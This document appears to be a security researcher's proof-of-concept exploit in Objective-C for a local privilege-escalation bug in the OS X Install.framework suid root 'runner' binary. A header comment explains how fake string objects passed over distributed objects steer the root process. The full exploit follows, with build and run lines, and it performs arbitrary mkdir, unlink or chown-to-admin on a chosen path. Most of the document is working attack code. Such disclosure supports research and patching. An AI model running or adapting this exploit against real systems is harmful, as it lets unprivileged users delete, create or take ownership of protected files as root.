/*
  OS X Install.framework suid root binary allows arbitrary mkdir, unlink and chown (to admin group) due to unexpected interactions with distributed objects
  ianbeer

  Install.framework has a suid root binary here: /System/Library/PrivateFrameworks/Install.framework/Resources/runner
  This binary vends the IFInstallRunner Distributed Object, which has the following method:

  [IFInstallRunner makeReceiptDirAt:asRoot:]

  If you pass 1 for asRoot, then this code will treat the makeReceiptDirAt string as a path and make two directories
  (Library/Receipts) below it. At first glance this code looks immediately racy and no doubt we could play some
  symlink tricks to get arbitrary directories created, but, on second glance, we can do a lot more!

  This code is using distributed objects which is a "transparent" IPC mechanism: what this means in practise is that
  not only can I call methods on the IFInstallRunner object running in the suid root process, but I can also pass it objects
  from my process; when the suid root process then tries to call methods on those object this will actually result in callbacks
  into my process :)

  In this case rather than just passing an NSString as the makeReceiptDirAt parameter I create and pass an instance of my own class
  "InitialPathObject" which behaves a bit like a string but gives me complete control over its behaviour from my process.

  By creating a couple of this custom classes and implementing various methods we can reach calls to mkdir, chown and unlink with euid == 0.
  We can completely control the string passed to mkdir and unlink.
  In the chown case the code will chown our controlled path to root:admin; regular os x users are members of the admin group which means that this
  will give the user access to files which previously belonged to a different group.

  To hit the three actions (mkdir, chown and unlink) with controlled arguments we need to override various
  combinations of selectors and fail at the right points:

  InitialPathObject = the object we pass to the makeReceiptDirAt selector
    overrides: - stringByAppendingPathComponent
                 * will be called twice:
                    * first time:  return an NSString* pointing to a non-existant file
                    * second time: return SecondFakeStringObject

  SecondFakeStringObject = returned by the second call to stringByAppendingPathComponent
    overrides: - length
                 * will be called by the NSFileManager?
                 * return length of path to non-existant file
               - getCharacters:
                 * will be called by the NSFileManager?
                 * return character of the non-existant file path
               - fileSystemRepresentation
                 * for MKDIR:
                   * first time: return char* of the target path
                   * second time: return char* to non-existant file
                   * third time: return char* to non-existant file
                 * for CHOWN:
                   * first time: return char* of temporary directory to create and ignore
                   * second time: return char* of target path
                 * for UNLINK:
                   * first time: return char* of temporary directory to create and ignore
                   * second time: return char* to non-existant file
                   * third time: return char* to path to unlink
               - stringByAppendingPathComponent:
                 * for MKDIR:
                   * not called
                 * for CHOWN:
                   * return NSString* pointing to file which does exist // to bail out before creating /Receipts
                 * for UNLINK
                   * not called

  build: clang -o as_root_okay_then_poc as_root_okay_then_poc.m -framework Foundation
  run: ./as_root_okay_then_poc MKDIR|CHOWN|UNLINK <target>

  note that this will create some root-owned temporary directories in /tmp which will need to be manually cleaned up
*/

#import <objc/Object.h>
#import <Foundation/Foundation.h>

#import <stdio.h>
#import <string.h>
#import <time.h>
#import <unistd.h>


typedef enum _action_t {ACTION_MKDIR, ACTION_CHOWN, ACTION_UNLINK} action_t;
action_t action = ACTION_MKDIR;
char* target_path = NULL;

char* non_existant_file = "/this/file/does/not/exist";
char temporary_file_to_ignore[256];
char* any_file_which_exists = "/sbin/ping";

const char* vended_server = "exploit_callback_server";
const char* suid_binary_path = "/System/Library/PrivateFrameworks/Install.framework/Resources/runner";


@interface SecondFakeStringObject : NSObject
{
  int count;
}

- (id) init;
- (NSString*) stringByAppendingPathComponent: (NSString*) aString;
- (char*) fileSystemRepresentation;
- (int) length;
- (void)getCharacters:(unichar *)buffer range:(NSRange)aRange;
@end

@implementation SecondFakeStringObject
- (id)init {
  self = [super init];
  if (self) {
    count = 0;
  }
  return self;
}

- (NSString*) stringByAppendingPathComponent: (NSString*) aString;
{
  return @(any_file_which_exists);
}

- (void)getCharacters:(unichar *)buffer range:(NSRange)aRange;
{
  NSLog(@"called getCharacters");
  NSLog(@"doing nothing");
}

- (int) length;
{
  NSLog(@"called length");
  return strlen(non_existant_file);
}

- (char*) fileSystemRepresentation;
{
  NSLog(@"called fileSystemRepresentation");
  int step = count++;
  printf("step: %d\n", step);
  switch (action) {
    case ACTION_MKDIR:
      {
        switch (step) {
          case 0:
            return target_path;
          case 1:
            return non_existant_file;
          case 2:
            return non_existant_file;
        }
      }
    case ACTION_CHOWN:
      {
        switch (step) {
          case 0:
            return temporary_file_to_ignore;
          case 1:
            return target_path;
        }
      }
    case ACTION_UNLINK:
      {
        switch (step) {
          case 0:
            return temporary_file_to_ignore;
          case 1:
            return non_existant_file;
          case 2:
            return target_path;
        }
      }
  }
}

@end



@interface InitialPathObject : NSObject
{
  int count;
}

- (id) stringByAppendingPathComponent: (NSString*) aString;
- (id) init;
@end

@implementation InitialPathObject

- (id)init {
  self = [super init];
  if (self) {
    count = 0;
  }
  return self;
}

- (id) stringByAppendingPathComponent: (NSString*) aString;
{
  NSLog(@"called stringByAppendingPathComponent");
  NSLog(aString);
  if (count == 0) {
    count = 1;
    NSLog(@"first time: returning a path to a non-existant file");
    return @(non_existant_file);
  }
  NSLog(@"second time: returning the a SecondFakeStringObject");
  SecondFakeStringObject* leak_it = [[SecondFakeStringObject alloc] init];
  [leak_it retain];
  return leak_it;
}

@end


@interface FakeVendor : NSObject
{
@private
  NSString*  runnerConnectionName;
}

- (oneway void) setRunnerPid: (int) pid;
- (oneway void) setRunnerConnectionName: (NSString*) name;
- (void) fork_exec_suid;
- (void) part_2;

@end

@implementation FakeVendor

- (oneway void) setRunnerPid: (int) pid;
{
  NSLog(@"called setRunnerPid");
  printf("the suid runner's pid is %d\n", pid);
}

- (oneway void) setRunnerConnectionName: (NSString*) name;
{
  NSLog(@"got the IFInstallRunner Distributed Object name:");
  NSLog(name);
  [name retain];
  runnerConnectionName = name;
  [self performSelector:@selector(part_2) withObject:nil afterDelay:0];
}

- (void) fork_exec_suid;
{
  NSLog(@"forking and execing suid child...");
  int fds[2];
  pipe(fds);

  int read_end = fds[0];
  int write_end = fds[1];

  pid_t p = fork();
  if (p == -1) {
    NSLog(@"fork failed?");
    exit(EXIT_FAILURE);
  }
  if (p == 0) {
    // child
    // close the write end of the pipe
    close(write_end);

    // dup2 the read end of the pipe to stdin
    dup2(read_end, STDIN_FILENO);
    
    // execve the suid binary:
    char* argv[] = {suid_binary_path, NULL};
    char* envp[] = {NULL};
    execve(suid_binary_path, argv, envp);
  } else {
    // parent
    // close the read end of the pipe
    close(read_end);
    
    // write the vender_server name to stdin of the suid_binary:
    write(write_end, vended_server, strlen(vended_server));
    write(write_end, "\n", 1);
    NSLog(@"wrote server name to suid stdin");
  }
}

- (void) part_2;
{
  NSLog(@"connecting proxy object to IFInstallRunner...");
  id theProxy;
  theProxy = [[NSConnection
      rootProxyForConnectionWithRegisteredName:runnerConnectionName
      host:nil] retain];


  //[theProxy makeReceiptDirAt:@("/Users/ianbeer/racer/exploit/jmp/") asRoot:1];
  InitialPathObject* ipo = [[InitialPathObject alloc] init];
  [ipo retain];
  [theProxy makeReceiptDirAt:ipo asRoot:1];

  NSLog(@"sent makeReceiptDirAt message...");

}

@end

void usage(int argc, char** argv) {
    printf("usage: ./%s MKDIR|CHOWN|UNLINK <target>\n", argv[0]); 
}

int main (int argc, char** argv) {
  if (argc < 3) {
    usage(argc, argv);
    return EXIT_SUCCESS;
  }
  
  // get the action
  const char* action_str = argv[1];
  if (strcasecmp(action_str, "MKDIR") == 0) {
    action = ACTION_MKDIR;    
  } else if (strcasecmp(action_str, "CHOWN") == 0) {
    action = ACTION_CHOWN;
  } else if (strcasecmp(action_str, "UNLINK") == 0) {
    action = ACTION_UNLINK;
  } else {
    printf("unknown action %s\n", action_str);
    usage(argc, argv);
    return EXIT_FAILURE;
  }

  sprintf(temporary_file_to_ignore, "/tmp/mkdir_this_%ld", time(NULL));
  target_path = argv[2];

  FakeVendor* serverObject = [FakeVendor alloc];
  [serverObject init];

  NSConnection *theConnection;
  
  // register our callback object for the SUID root binary to connect to  
  theConnection = [NSConnection defaultConnection];
  [theConnection retain];
  
  [theConnection setRootObject:serverObject];
  if ([theConnection registerName:@(vended_server)] == NO) {
    NSLog(@"couldn't register object name");
  }

  NSLog(@"starting run loop");

  [serverObject performSelector:@selector(fork_exec_suid) withObject:nil afterDelay:0];

  [[NSRunLoop currentRunLoop] run];

  return 0;
}
